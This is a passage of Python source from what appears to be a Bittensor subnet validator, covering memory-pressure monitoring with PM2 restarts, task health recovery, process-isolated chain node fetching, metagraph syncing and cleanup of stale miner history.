                if not hasattr(self, '_emergency_memory_start_time'):
                    self._emergency_memory_start_time = current_time
                    logger.warning(f"🕐 Emergency memory pressure started - will force restart if sustained for 60 seconds")
                
                emergency_duration = current_time - self._emergency_memory_start_time
                
                # Try light GC at emergency level
                if current_time - self.last_emergency_gc_time > 30:  # More frequent GC at emergency level
                    collected = gc.collect()
                    logger.warning(f"Emergency light GC collected {collected} objects")
                    self.last_emergency_gc_time = current_time
                    
                    # Check if memory reduced after GC
                    post_emergency_gc_memory = process.memory_info().rss / (1024 * 1024)
                    if post_emergency_gc_memory < self.memory_emergency_threshold_mb:
                        logger.info(f"✅ Emergency GC successful - memory reduced to {post_emergency_gc_memory:.1f} MB")
                        if hasattr(self, '_emergency_memory_start_time'):
                            delattr(self, '_emergency_memory_start_time')
                    elif emergency_duration > 60:  # 60 seconds of emergency pressure
                        if critical_operations_active:
                            logger.error(f"🔄 EMERGENCY TIMEOUT: {emergency_duration:.0f}s of emergency memory pressure - forcing restart despite critical operations")
                        else:
                            logger.error(f"🔄 EMERGENCY TIMEOUT: {emergency_duration:.0f}s of emergency memory pressure - forcing restart")
                        
                        if self.pm2_restart_enabled:
                            await self._trigger_pm2_restart(f"Emergency memory pressure sustained for {emergency_duration:.0f} seconds")
                            return
                        else:
                            logger.error("💀 EMERGENCY TIMEOUT BUT PM2 RESTART DISABLED - system at high OOM risk")
                            
            elif memory_mb > self.memory_warning_threshold_mb:
                # Only log warning once per interval to avoid spam
                if current_time - self.last_memory_log_time > (self.memory_log_interval / 2):  # Half interval for warnings
                    logger.warning(f"🟡 HIGH MEMORY: Validator process using {memory_mb:.1f} MB ({system_percent:.1f}% of system) (threshold: {self.memory_warning_threshold_mb} MB)")
            else:
                # Memory is below all thresholds - reset emergency timer
                if hasattr(self, '_emergency_memory_start_time'):
                    delattr(self, '_emergency_memory_start_time')
                    
        except ImportError:
            if self.memory_monitor_enabled:
                logger.warning("psutil not available - memory monitoring disabled")
                self.memory_monitor_enabled = False
        except Exception as e:
            logger.error(f"Error in memory monitoring: {e}", exc_info=True)

    def _check_critical_operations_active(self):
        """Check if any critical operations are currently active that shouldn't be interrupted.
        
        With higher memory thresholds, we can be more protective of important operations.
        """
        critical_ops = []
        
        for task_name, health in self.task_health.items():
            if health['status'] in ['processing'] and health.get('current_operation'):
                # Critical operations that should have brief grace period before forced restart
                critical_operation_patterns = [
                    'weight_setting',  # Blockchain integrity - always critical
                    'scoring',         # Weather scoring is expensive to restart
                    'day1_scoring',    # Day1 scoring in progress
                    'era5_scoring',    # ERA5 final scoring in progress
                ]
                
                current_op = health.get('current_operation', '')
                if any(pattern in current_op for pattern in critical_operation_patterns):
                    critical_ops.append(f"{task_name}:{current_op}")
        
        return critical_ops

    async def _get_pm2_process_name(self):
        """Dynamically get PM2 process name using PM2's JSON list"""
        try:
            # Get the PM2 process ID from environment variables
            pm_id = (os.getenv('pm_id') or 
                    os.getenv('NODE_APP_INSTANCE') or 
                    os.getenv('PM2_INSTANCE_ID'))
            
            if pm_id is None:
                return None  # Not running under PM2
            
            # Use PM2 to get process info
            import subprocess
            import json
            result = await asyncio.to_thread(
                lambda: subprocess.run(["pm2", "jlist"], capture_output=True, text=True)
            )
            
            if result.returncode != 0:
                logger.warning(f"Failed to get PM2 process list: {result.stderr}")
                return None
                
            processes = json.loads(result.stdout)
            
            # Find the process with matching pm_id
            for process in processes:
                if str(process.get("pm_id")) == str(pm_id):
                    process_name = process.get("name")
                    logger.info(f"Found PM2 process: {process_name} (ID: {pm_id})")
                    return process_name
            
            logger.warning(f"PM2 process with ID {pm_id} not found in process list")
            return None
            
        except Exception as e:
            logger.error(f"Error getting PM2 process name: {e}")
            return None

    async def _trigger_pm2_restart(self, reason: str):
        """Trigger a controlled PM2 restart for the validator."""
        if not self.pm2_restart_enabled:
            logger.error(f"🚨 PM2 restart disabled - would restart for: {reason}")
            return
            
        logger.error(f"🔄 TRIGGERING CONTROLLED PM2 RESTART: {reason}")
        
        try:
            # Try graceful shutdown first
            logger.info("Attempting graceful shutdown before restart...")
            
            # Stop any ongoing tasks
            try:
                await self.cleanup_resources()
                logger.info("Validator cleanup completed")
            except Exception as e:
                logger.warning(f"Error during validator cleanup: {e}")
            
            # Force garbage collection one more time
            import gc
            collected = gc.collect()
            logger.info(f"Final GC before restart collected {collected} objects")
            
            # Dynamically get PM2 process name
            process_name = await self._get_pm2_process_name()
            if process_name:
                logger.info(f"Running under PM2 process '{process_name}' - triggering restart...")
                # Use pm2 restart command with process name
                import subprocess
                subprocess.Popen(['pm2', 'restart', process_name, '--update-env'])
            else:
                logger.warning("Not running under PM2 or process not found - triggering system exit")
                # If not under pm2, exit gracefully
                import sys
                sys.exit(1)
                
        except Exception as e:
            logger.error(f"Error during controlled restart: {e}")
            # Last resort - force exit
            import sys
            sys.exit(1)

    async def _check_resource_usage(self, current_time):
        """Check resource usage for active tasks."""
        import psutil
        process = psutil.Process()
        for task_name, health in self.task_health.items():
            if health['status'] != 'idle':
                current_memory = process.memory_info().rss
                health['resources']['memory_peak'] = max(
                    current_memory,
                    health['resources'].get('memory_peak', 0)
                )
                health['resources']['cpu_percent'] = process.cpu_percent()
                health['resources']['open_files'] = len(process.open_files())
                health['resources']['threads'] = process.num_threads()
                health['resources']['last_update'] = current_time
                
                # Log if memory usage has increased significantly
                if current_memory > health['resources']['memory_peak'] * 1.5:  # 50% increase
                    logger.warning(
                        f"High memory usage in task {task_name} | "
                        f"Current: {current_memory / (1024*1024):.2f}MB | "
                        f"Previous Peak: {health['resources']['memory_peak'] / (1024*1024):.2f}MB"
                    )

    async def _check_task_health(self, current_time):
        """Check health of all tasks."""
        for task_name, health in self.task_health.items():
            if health['status'] == 'idle':
                continue
                
            timeout = health['timeouts'].get(
                health.get('current_operation'),
                health['timeouts']['default']
            )
            
            if health['operation_start'] and current_time - health['operation_start'] > timeout:
                operation_duration = current_time - health['operation_start']
                logger.warning(
                    f"TIMEOUT_ALERT - Task: {task_name} | "
                    f"Operation: {health.get('current_operation')} | "
                    f"Duration: {operation_duration:.2f}s | "
                    f"Timeout: {timeout}s | "
                    f"Status: {health['status']} | "
                    f"Errors: {health['errors']}"
                )
                
                if health['status'] != 'processing':
                    logger.error(
                        f"FREEZE_DETECTED - Task {task_name} appears frozen - "
                        f"Last Operation: {health.get('current_operation')} - "
                        f"Starting recovery"
                    )
                    try:
                        await self.recover_task(task_name)
                        health['errors'] = 0
                        logger.info(f"Successfully recovered task {task_name}")
                    except Exception as e:
                        logger.error(f"Failed to recover task {task_name}: {e}")
                        logger.error(traceback.format_exc())
                        health['errors'] += 1

    async def _fetch_nodes_managed(self, netuid, force_fresh=False):
        """
        Fetch nodes using get_nodes_for_netuid but with aggressive connection management.
        Use cached nodes when possible to avoid any substrate calls.
        
        Args:
            netuid: Network UID to fetch nodes for
            force_fresh: If True, bypass cache and force fresh node fetch
        """
        try:
            logger.debug(f"Fetching nodes for netuid {netuid} using ultra-aggressive memory management")
            
            # First, try to use cached nodes from metagraph if available and recent (unless force_fresh is True)
            if (not force_fresh and hasattr(self, 'metagraph') and self.metagraph and 
                hasattr(self.metagraph, 'nodes') and self.metagraph.nodes and
                hasattr(self, 'last_metagraph_sync') and 
                time.time() - self.last_metagraph_sync < 300):  # Use cache if less than 5 minutes old
                
                logger.info(f"✅ Using cached metagraph nodes ({len(self.metagraph.nodes)} nodes) - NO substrate calls needed")
                # Convert metagraph nodes dict to list format expected by callers
                cached_nodes = []
                for hotkey, node in self.metagraph.nodes.items():
                    if hasattr(node, 'node_id'):
                        cached_nodes.append(node)
                    else:
                        # Create a simple node object if metagraph node doesn't have the right format
                        simple_node = type('Node', (), {
                            'node_id': getattr(node, 'uid', 0),
                            'hotkey': hotkey,
                            'ip': getattr(node, 'ip', '0.0.0.0'),
                            'port': getattr(node, 'port', 0),
                            'ip_type': getattr(node, 'ip_type', 4),
                            'protocol': getattr(node, 'protocol', 4),
                            'placeholder1': 0,
                            'placeholder2': 0,
                        })()
                        cached_nodes.append(simple_node)
                return cached_nodes
            
            # If no cache available or force_fresh is True, make the substrate call
            if force_fresh:
                logger.info("🔄 FORCE_FRESH: Bypassing node cache for fresh data")
            else:
                logger.warning("No cached nodes available - making substrate call (potential memory leak)")
            
            # More aggressive patching - patch multiple possible import locations
            import fiber.chain.interface as fiber_interface
            import fiber.chain.fetch_nodes as fetch_nodes_module
            
            # Store originals
            original_get_substrate = fiber_interface.get_substrate
            original_fetch_get_substrate = getattr(fetch_nodes_module, 'get_substrate', None)
            
                        # ULTRA-PATCHING DISABLED FOR SUBSTRATE MANAGER TESTING
            # def ultra_patched_get_substrate(*args, **kwargs):
            #     logger.warning("!!! SUBSTRATE CONNECTION INTERCEPTED - using managed connection instead !!!")
            #     return self.substrate

            # Apply patches everywhere
            # fiber_interface.get_substrate = ultra_patched_get_substrate
            # if original_fetch_get_substrate:
            #     fetch_nodes_module.get_substrate = ultra_patched_get_substrate
            
            try:
                # Create fresh substrate connection using substrate manager with process isolation
                self.substrate = get_fresh_substrate_connection(
                    subtensor_network=self.subtensor_network,
                    chain_endpoint=self.subtensor_chain_endpoint,
                    use_process_isolation=True
                )
                logger.info("🔄 Created fresh connection for node fetching using substrate manager")
                # Use process-isolated node fetching instead of fiber library function
                nodes = await self._fetch_nodes_process_isolated(netuid)
                logger.info(f"🛡️ Fetched {len(nodes) if nodes else 0} nodes with process-isolated substrate (ABC leak prevented)")
                return nodes
            finally:
                # Always restore originals
                fiber_interface.get_substrate = original_get_substrate
                if original_fetch_get_substrate:
                    fetch_nodes_module.get_substrate = original_fetch_get_substrate
                
        except Exception as e:
            logger.error(f"Error in ultra-aggressive node fetching: {e}")
            logger.error(traceback.format_exc())
            # Final fallback - use process-isolated fetching
            logger.error("CRITICAL: All node fetching approaches failed - using process-isolated fallback")
            return await self._fetch_nodes_process_isolated(netuid)

    async def _fetch_nodes_process_isolated(self, netuid: int):
        """
        Fetch nodes using process-isolated substrate queries to prevent ABC memory leaks.
        This replaces the fiber library's get_nodes_for_netuid function which creates internal substrate connections.
        """
        try:
            logger.debug(f"🛡️ Fetching nodes for netuid {netuid} using process-isolated substrate")
            
            # Use process-isolated substrate for all queries
            substrate = get_process_isolated_substrate(
                subtensor_network=self.subtensor_network,
                chain_endpoint=self.subtensor_chain_endpoint
            )
            
            # Query node data using process isolation with longer timeout for complex operations
            # Use 120s timeout since the substrate network can be slow during high load
            timeout = 120.0
            logger.debug(f"🛡️ Making {13} substrate queries with {timeout}s timeout each")
            
            hotkeys = substrate._run_substrate_operation("query", "SubtensorModule", "Hotkeys", [netuid], timeout=timeout)
            coldkeys = substrate._run_substrate_operation("query", "SubtensorModule", "Coldkeys", [netuid], timeout=timeout)
            uids = substrate._run_substrate_operation("query", "SubtensorModule", "Uids", [netuid], timeout=timeout)
            stakes = substrate._run_substrate_operation("query", "SubtensorModule", "Stake", [netuid], timeout=timeout)
            trust = substrate._run_substrate_operation("query", "SubtensorModule", "Trust", [netuid], timeout=timeout)
            vtrust = substrate._run_substrate_operation("query", "SubtensorModule", "ValidatorTrust", [netuid], timeout=timeout)
            incentive = substrate._run_substrate_operation("query", "SubtensorModule", "Incentive", [netuid], timeout=timeout)
            emission = substrate._run_substrate_operation("query", "SubtensorModule", "Emission", [netuid], timeout=timeout)
            consensus = substrate._run_substrate_operation("query", "SubtensorModule", "Consensus", [netuid], timeout=timeout)
            dividends = substrate._run_substrate_operation("query", "SubtensorModule", "Dividends", [netuid], timeout=timeout)
            last_update = substrate._run_substrate_operation("query", "SubtensorModule", "LastUpdate", [netuid], timeout=timeout)
            validator_permit = substrate._run_substrate_operation("query", "SubtensorModule", "ValidatorPermit", [netuid], timeout=timeout)
            
            # Get axon info with extended timeout
            axons = substrate._run_substrate_operation("query", "SubtensorModule", "Axons", [netuid], timeout=timeout)
            
            # Build node objects (similar to fiber's get_nodes_for_netuid)
            nodes = []
            
            if hotkeys and len(hotkeys) > 0:
                for i, hotkey in enumerate(hotkeys):
                    try:
                        # Create a Node-like object with the data
                        from types import SimpleNamespace
                        
                        node = SimpleNamespace()
                        node.node_id = i
                        node.hotkey = hotkey
                        node.coldkey = coldkeys[i] if i < len(coldkeys) else ""
                        
                        # Handle stake (might be in different format)
                        if stakes and i < len(stakes):
                            stake_value = stakes[i]
                            # Convert stake to float (handle different formats)
                            if isinstance(stake_value, dict):
                                node.stake = float(sum(stake_value.values())) if stake_value else 0.0
                            else:
                                node.stake = float(stake_value) if stake_value else 0.0
                        else:
                            node.stake = 0.0
                        
                        # Set other attributes with safe indexing
                        node.trust = float(trust[i]) if trust and i < len(trust) else 0.0
                        node.vtrust = float(vtrust[i]) if vtrust and i < len(vtrust) else 0.0
                        node.incentive = float(incentive[i]) if incentive and i < len(incentive) else 0.0
                        node.emission = float(emission[i]) if emission and i < len(emission) else 0.0
                        node.consensus = float(consensus[i]) if consensus and i < len(consensus) else 0.0
                        node.dividends = float(dividends[i]) if dividends and i < len(dividends) else 0.0
                        node.last_update = int(last_update[i]) if last_update and i < len(last_update) else 0
                        
                        # Handle axon info
                        if axons and i < len(axons):
                            axon_info = axons[i]
                            if axon_info:
                                node.ip = axon_info.get('ip', '')
                                node.port = int(axon_info.get('port', 0))
                                node.ip_type = int(axon_info.get('ip_type', 4))
                                node.protocol = int(axon_info.get('protocol', 4))
                            else:
                                node.ip = ''
                                node.port = 0
                                node.ip_type = 4
                                node.protocol = 4
                        else:
                            node.ip = ''
                            node.port = 0
                            node.ip_type = 4
                            node.protocol = 4
                        
                        nodes.append(node)
                        
                    except Exception as e:
                        logger.warning(f"Error processing node {i}: {e}")
                        continue
            
            logger.info(f"🛡️ Process-isolated node fetch completed: {len(nodes)} nodes (NO ABC memory leak)")
            return nodes
            
        except Exception as e:
            logger.error(f"Error in process-isolated node fetching: {e}")
            logger.error(traceback.format_exc())
            return []

    async def _sync_metagraph(self):
        """Sync the metagraph using fresh substrate connection with standard fiber methods."""
        # Use lock to prevent concurrent syncs
        async with self.metagraph_sync_lock:
            # Check if another sync just completed while we were waiting for the lock
            current_time = time.time()
            if hasattr(self, 'last_metagraph_sync') and current_time - self.last_metagraph_sync < 30:
                logger.debug(f"Metagraph recently synced {current_time - self.last_metagraph_sync:.1f}s ago, skipping")
                return
            
            sync_start = time.time()
            
            try:
                # Check if we need a fresh substrate connection (reuse for 15 minutes)
                current_time = time.time()
                connection_age = current_time - self.substrate_connection_created_at
                needs_fresh_connection = (
                    not hasattr(self, 'substrate') or 
                    self.substrate is None or 
                    connection_age > 900  # Increased from 600s (10min) to 900s (15min)
                )
                
                if needs_fresh_connection:
                    old_substrate = getattr(self, 'substrate', None)
                    self.substrate = get_fresh_substrate_connection(
                        subtensor_network=self.subtensor_network,
                        chain_endpoint=self.subtensor_chain_endpoint,
                        use_process_isolation=True
                    )
                    self.substrate_connection_created_at = current_time
                    logger.info(f"🔄 Created fresh substrate connection (age: {connection_age:.1f}s, limit: 900s)")
                else:
                    logger.debug(f"♻️ Reusing substrate connection (age: {connection_age:.1f}s, limit: 900s)")
                
                # Update metagraph to use the fresh connection
                if hasattr(self, 'metagraph') and self.metagraph:
                    self.metagraph.substrate = self.substrate
                    
                    # Use standard fiber sync_nodes() method - simple and reliable
                    connection_type = "fresh" if needs_fresh_connection else "reused"
                    logger.debug(f"Using standard fiber sync_nodes() with {connection_type} substrate connection")
                    await asyncio.to_thread(self.metagraph.sync_nodes)
                    
                    node_count = len(self.metagraph.nodes) if self.metagraph.nodes else 0
                    logger.info(f"✅ Metagraph sync completed: {node_count} nodes using {connection_type} substrate connection")
                else:
                    logger.error("Metagraph not initialized, cannot sync nodes")
                    return
                    
            except Exception as e:
                logger.error(f"Error during metagraph sync: {e}")
                logger.error(traceback.format_exc())
                # Don't fall back to anything complex - just log and continue
                logger.warning("Metagraph sync failed - will retry on next cycle")
                
            sync_duration = time.time() - sync_start
            self.last_metagraph_sync = time.time()
            
            # Enhanced logging
            if sync_duration > 30:  # Log slow syncs
                logger.warning(f"Slow metagraph sync: {sync_duration:.2f}s")
            else:
                logger.debug(f"Metagraph sync completed in {sync_duration:.2f}s")
            
            # Log substrate connection status
            if needs_fresh_connection:
                logger.debug("Substrate connection refreshed during metagraph sync")
            else:
                logger.debug("Substrate connection reused during metagraph sync")

    def _track_background_task(self, task: asyncio.Task, task_name: str = "unnamed"):
        """Track background tasks for proper cleanup and memory leak prevention."""
        self._background_tasks.add(task)
        
        # Add cleanup callback when task completes
        def cleanup_task(completed_task):
            self._background_tasks.discard(completed_task)
            if completed_task.cancelled():
                logger.debug(f"Background task '{task_name}' was cancelled")
            elif completed_task.exception():
                logger.warning(f"Background task '{task_name}' failed: {completed_task.exception()}")
            else:
                logger.debug(f"Background task '{task_name}' completed successfully")
        
        task.add_done_callback(cleanup_task)
        logger.debug(f"Tracking background task '{task_name}' (total: {len(self._background_tasks)})")
        return task

    def create_tracked_task(self, coro, task_name: str = "unnamed"):
        """Create and track a background task to prevent memory leaks."""
        task = asyncio.create_task(coro)
        return self._track_background_task(task, task_name)
        
    def _get_current_block_cached(self, force_refresh: bool = False) -> int:
        """Get current block number with intelligent caching to reduce substrate queries."""
        current_time = time.time()
        cache = self._shared_block_cache
        
        # Check if we need to refresh the cache
        should_refresh = (
            force_refresh or
            cache['block_number'] is None or
            current_time - cache['last_update_time'] > cache['cache_duration']
        )
        
        if should_refresh:
            try:
                resp = self.substrate.rpc_request("chain_getHeader", [])
                hex_num = resp["result"]["number"]
                block_number = int(hex_num, 16)
                
                # Update cache
                cache['block_number'] = block_number
                cache['last_update_time'] = current_time
                
                # Update instance variable for compatibility
                self.current_block = block_number
                
                logger.debug(f"Refreshed shared block cache: {block_number} (age will be 0s)")
                return block_number
                
            except Exception as e:
                logger.error(f"Failed to get current block: {e}")
                # Return cached value if available, otherwise raise
                if cache['block_number'] is not None:
                    logger.warning(f"Using stale cached block number: {cache['block_number']}")
                    return cache['block_number']
                raise
        else:
            # Use cached value
            cached_age = current_time - cache['last_update_time']
            logger.debug(f"Using cached block number: {cache['block_number']} (age: {cached_age:.1f}s)")
            self.current_block = cache['block_number']
            return cache['block_number']

    def _aggressive_substrate_cleanup(self, context: str = "substrate_cleanup"):
        """Aggressive cleanup of substrate/scalecodec module caches."""
        try:
            import sys
            import gc
            
            substrate_modules_cleared = 0
            cache_objects_cleared = 0
            
            # Target substrate-related modules specifically
            substrate_patterns = [
                'substrate', 'scalecodec', 'scale_info', 'metadata', 
                'substrateinterface', 'scale_codec', 'polkadot'
            ]
            
            for module_name in list(sys.modules.keys()):
                if any(pattern in module_name.lower() for pattern in substrate_patterns):
                    module = sys.modules.get(module_name)
                    if hasattr(module, '__dict__'):
                        module_cleared = False
                        
                        # Clear all cache-like attributes in substrate modules
                        for attr_name in list(module.__dict__.keys()):
                            if any(cache_pattern in attr_name.lower() for cache_pattern in 
                                   ['cache', 'registry', '_cached', '_memo', '_lru', '_store', 
                                    '_type_registry', '_metadata', '_runtime', '_version']):
                                try:
                                    cache_obj = getattr(module, attr_name)
                                    if hasattr(cache_obj, 'clear') and callable(cache_obj.clear):
                                        cache_obj.clear()
                                        cache_objects_cleared += 1
                                        module_cleared = True
                                    elif isinstance(cache_obj, (dict, list, set)):
                                        cache_obj.clear()
                                        cache_objects_cleared += 1
                                        module_cleared = True
                                except Exception:
                                    pass
                        
                        if module_cleared:
                            substrate_modules_cleared += 1
            
            # Force garbage collection after substrate cleanup
            collected = gc.collect()
            
            if substrate_modules_cleared > 0:
                logger.info(f"Substrate cleanup ({context}): cleared {cache_objects_cleared} cache objects "
                          f"from {substrate_modules_cleared} substrate modules, GC collected {collected}")
                return cache_objects_cleared
            else:
                logger.debug(f"Substrate cleanup ({context}): no substrate caches found to clear")
                return 0
                
        except Exception as e:
            logger.debug(f"Error during aggressive substrate cleanup: {e}")
            return 0
        
    async def _cleanup_background_tasks(self):
        """Clean up all tracked background tasks."""
        async with self._task_cleanup_lock:
            if not self._background_tasks:
                return
                
            logger.info(f"Cleaning up {len(self._background_tasks)} background tasks...")
            
            # Cancel all tasks
            for task in self._background_tasks:
                if not task.done():
                    task.cancel()
            
            # Wait for cancellation with timeout
            if self._background_tasks:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*self._background_tasks, return_exceptions=True),
                        timeout=10.0
                    )
                    logger.info("Successfully cancelled all background tasks")
                except asyncio.TimeoutError:
                    logger.warning("Timeout cancelling background tasks")
                except Exception as e:
                    logger.warning(f"Error cancelling background tasks: {e}")
                finally:
                    self._background_tasks.clear()

    async def cleanup_resources(self):
        """Clean up any resources used by the validator during recovery."""
        try:
            # MEMORY LEAK FIX: Clean up background tasks first
            await self._cleanup_background_tasks()
            
            # First clean up database resources
            if hasattr(self, 'database_manager'):
                await self.database_manager.execute(
                    """
                    UPDATE geomagnetic_predictions 
                    SET status = 'pending'
                    WHERE status = 'processing'
                    """
                )
                logger.info("Reset in-progress prediction statuses")
                
                await self.database_manager.execute(
                    """
                    DELETE FROM score_table 
                    WHERE task_name = 'geomagnetic' 
                    AND status = 'processing'
                    """
                )
                logger.info("Cleaned up incomplete scoring operations")
                
                # Close database connections
                await self.database_manager.close_all_connections()
                logger.info("Closed database connections")

            # Clean up HTTP clients
            if hasattr(self, 'miner_client') and self.miner_client and not self.miner_client.is_closed:
                # Clean up connections before closing client
                try:
                    await self._cleanup_idle_connections()
                except Exception as e:
                    logger.debug(f"Error cleaning up connections before client close: {e}")
                
                await self.miner_client.aclose()
                logger.info("Closed miner HTTP client")
            
            if hasattr(self, 'api_client') and self.api_client and not self.api_client.is_closed:
                await self.api_client.aclose()
                logger.info("Closed API HTTP client")

            # Clean up task-specific resources
            if hasattr(self, 'miner_score_sender'):
                if hasattr(self.miner_score_sender, 'cleanup'):
                    await self.miner_score_sender.cleanup()
                logger.info("Cleaned up miner score sender resources")

            # Clean up WeatherTask resources that might be using gcsfs
            try:
                if hasattr(self, 'weather_task'):
                    await self.weather_task.cleanup_resources()
                    logger.info("Cleaned up WeatherTask resources")
            except Exception as e:
                logger.debug(f"Error cleaning up WeatherTask: {e}")

            # Clean up substrate manager
            try:
                cleanup_global_substrate_manager()
                logger.info("Cleaned up substrate manager")
            except Exception as e:
                logger.debug(f"Error cleaning up substrate manager: {e}")

            # Clean up AutoSyncManager
            try:
                if hasattr(self, 'auto_sync_manager') and self.auto_sync_manager:
                    await self.auto_sync_manager.shutdown()
                    logger.info("Cleaned up AutoSyncManager")
            except Exception as e:
                logger.debug(f"Error cleaning up AutoSyncManager: {e}")

            # Aggressive fsspec/gcsfs cleanup to prevent session errors blocking PM2 restart
            try:
                logger.info("Performing aggressive fsspec/gcsfs cleanup...")
                
                # Suppress all related warnings and errors that could block PM2 restart
                import logging
                import warnings
                logging.getLogger('fsspec').setLevel(logging.CRITICAL)
                logging.getLogger('gcsfs').setLevel(logging.CRITICAL)
                logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
                logging.getLogger('asyncio').setLevel(logging.CRITICAL)
                warnings.filterwarnings('ignore', category=RuntimeWarning, message='.*coroutine.*never awaited.*')
                warnings.filterwarnings('ignore', category=RuntimeWarning, message='.*Non-thread-safe operation.*')
                
                # Force clear fsspec caches and registries
                import fsspec
                fsspec.config.conf.clear()
                if hasattr(fsspec.filesystem, '_cache'):
                    fsspec.filesystem._cache.clear()
                
                # Try to close any active gcsfs sessions more aggressively
                try:
                    import gcsfs
                    # Clear any cached filesystems
                    if hasattr(gcsfs, '_fs_cache'):
                        gcsfs._fs_cache.clear()
                    if hasattr(gcsfs.core, '_fs_cache'):
                        gcsfs.core._fs_cache.clear()
                except ImportError:
                    pass
                except Exception:
                    pass  # Ignore any errors during aggressive cleanup
                
                # Force garbage collection to help clean up lingering references
                import gc
                gc.collect()
                
                # Set environment variable to suppress aiohttp warnings
                import os
                os.environ['PYTHONWARNINGS'] = 'ignore::RuntimeWarning'
                
                logger.info("Aggressive fsspec/gcsfs cleanup completed")
                
            except ImportError:
                logger.debug("fsspec not available for cleanup")
            except Exception as e:
                # Don't let cleanup errors block shutdown
                logger.debug(f"Non-critical error during aggressive cleanup: {e}")
            
            logger.info("Completed resource cleanup")
            
        except Exception as e:
            logger.error(f"Error during resource cleanup: {e}")
            # Don't raise the exception - let shutdown continue for PM2 restart
            logger.info("Continuing shutdown despite cleanup errors to allow PM2 restart")

    async def recover_task(self, task_name: str):
        """Enhanced task recovery with specific handling for each task type."""
        logger.warning(f"Attempting to recover {task_name}")
        try:
            # First clean up resources
            await self.cleanup_resources()
            
            # Task-specific recovery
            if task_name == "soil":
                await self.soil_task.cleanup_resources()
            elif task_name == "geomagnetic":
                await self.geomagnetic_task.cleanup_resources()
            elif task_name == "scoring":
                self.substrate = get_fresh_substrate_connection(
                    subtensor_network=self.subtensor_network,
                    chain_endpoint=self.subtensor_chain_endpoint,
                    use_process_isolation=True
                )
                self.substrate_connection_created_at = time.time()  # Track connection age for reuse
                logger.info("🔄 Force reconnect - created fresh substrate connection using substrate manager")
                await self._sync_metagraph()  # Use fresh connection
            elif task_name == "deregistration":
                await self._sync_metagraph()  # Use managed connection instead of direct sync
                self.nodes = {}
            
            # Reset task health
            health = self.task_health[task_name]
            health['errors'] = 0
            health['last_success'] = time.time()
            health['status'] = 'idle'
            health['current_operation'] = None
            health['operation_start'] = None
            
            logger.info(f"Successfully recovered task {task_name}")
            
        except Exception as e:
            logger.error(f"Failed to recover {task_name}: {e}")
            logger.error(traceback.format_exc())

    async def cleanup_stale_history_on_startup(self):
        """
        Compares historical prediction table hotkeys against the current metagraph
        and cleans up data for UIDs where hotkeys have changed or the UID is gone.
        Runs once on validator startup.
        """
        logger.info("Starting cleanup of stale miner history based on current metagraph...")
        try:
            if not self.metagraph:
                logger.warning("Metagraph not initialized, cannot perform stale history cleanup.")
                return
            if not self.database_manager:
                logger.warning("Database manager not initialized, cannot perform stale history cleanup.")
                return

            # 1. Fetch Current Metagraph State
            logger.info("Syncing metagraph for stale history check...")
            await self._sync_metagraph()  # Use fresh connection instead of direct sync
            
            # Fetch the list of nodes directly using our managed implementation
            try:
                active_nodes_list = await self._fetch_nodes_managed(self.metagraph.netuid)
                if active_nodes_list is None:
                    active_nodes_list = [] # Ensure it's an iterable if None is returned
                    logger.warning("Managed node fetching returned None, proceeding with empty list for stale history check.")
            except Exception as e_fetch_nodes:
                logger.error(f"Failed to fetch nodes for stale history check: {e_fetch_nodes}", exc_info=True)
                active_nodes_list = [] # Proceed with empty list to avoid further errors here

            # Build current_nodes_info mapping node_id (UID) to Node object
            current_nodes_info = {node.node_id: node for node in active_nodes_list}
            logger.info(f"Built current_nodes_info with {len(current_nodes_info)} active UIDs for stale history check.")

            # 2. Fetch Historical Data (Distinct uid, miner_hotkey pairs)
            geo_history_query = "SELECT DISTINCT miner_uid, miner_hotkey FROM geomagnetic_history WHERE miner_hotkey IS NOT NULL;"
            soil_history_query = "SELECT DISTINCT miner_uid, miner_hotkey FROM soil_moisture_history WHERE miner_hotkey IS NOT NULL;"
            
            all_historical_pairs = set()
            try:
                geo_results = await self.database_manager.fetch_all(geo_history_query)
                all_historical_pairs.update((row['miner_uid'], row['miner_hotkey']) for row in geo_results)
                logger.info(f"Found {len(geo_results)} distinct (miner_uid, hotkey) pairs in geomagnetic_history.")
            except Exception as e:
                logger.warning(f"Could not query geomagnetic_history (may not exist yet): {e}")

            try:
                soil_results = await self.database_manager.fetch_all(soil_history_query)
                all_historical_pairs.update((row['miner_uid'], row['miner_hotkey']) for row in soil_results)
                logger.info(f"Found {len(soil_results)} distinct (miner_uid, hotkey) pairs in soil_moisture_history.")
            except Exception as e:
                logger.warning(f"Could not query soil_moisture_history (may not exist yet): {e}")

            if not all_historical_pairs:
                logger.info("No historical data found to check. Skipping stale history cleanup.")
                return

            logger.info(f"Found {len(all_historical_pairs)} total distinct historical (miner_uid, hotkey) pairs to check.")

            # 3. Identify Mismatches
            uids_to_cleanup = defaultdict(set)  # uid -> {stale_historical_hotkey1, stale_historical_hotkey2, ...}
            
            # --- DIAGNOSTIC LOGGING START ---
            current_node_keys = list(current_nodes_info.keys())
            logger.info(f"Diagnostic: current_nodes_info has {len(current_node_keys)} keys. Sample keys: {current_node_keys[:5]} (Type: {type(current_node_keys[0]) if current_node_keys else 'N/A'})")
            # --- DIAGNOSTIC LOGGING END ---
            
            for hist_uid_str, hist_hotkey in all_historical_pairs:
                try:
                    hist_uid = int(hist_uid_str) # Convert hist_uid from string to int
                except (ValueError, TypeError):
                    logger.warning(f"Could not convert historical UID '{hist_uid_str}' to int. Skipping.")
                    continue
                    
                # --- DIAGNOSTIC LOGGING START ---
                logger.info(f"Diagnostic: Checking hist_uid: {hist_uid} (Type: {type(hist_uid)}), hist_hotkey: {hist_hotkey}")
                # --- DIAGNOSTIC LOGGING END ---
                current_node = current_nodes_info.get(hist_uid)
                # We assume if a UID exists in history, it MUST exist in the current metagraph
                # because slots are typically always filled. The important check is hotkey mismatch.
                if current_node is None:
                     # This case is highly unlikely if metagraph slots are always filled.
                     # Log a warning but don't trigger specific cleanup based on None node.
                     logger.warning(f"Found historical entry for miner_uid {hist_uid} (Hotkey: {hist_hotkey}), but node is unexpectedly None in current metagraph sync. Skipping direct cleanup based on this, hotkey mismatch check will handle if applicable.")
                     continue # Skip to next historical pair

                if current_node.hotkey != hist_hotkey:
                    # Hotkey mismatch: This is the primary condition for cleanup.
                    logger.warning(f"Mismatch found: miner_uid {hist_uid} historical hotkey {hist_hotkey} != current metagraph hotkey {current_node.hotkey}. Marking for cleanup.")
                    uids_to_cleanup[hist_uid].add(hist_hotkey)

            if not uids_to_cleanup:
                logger.info("No stale historical entries found requiring cleanup.")
                return

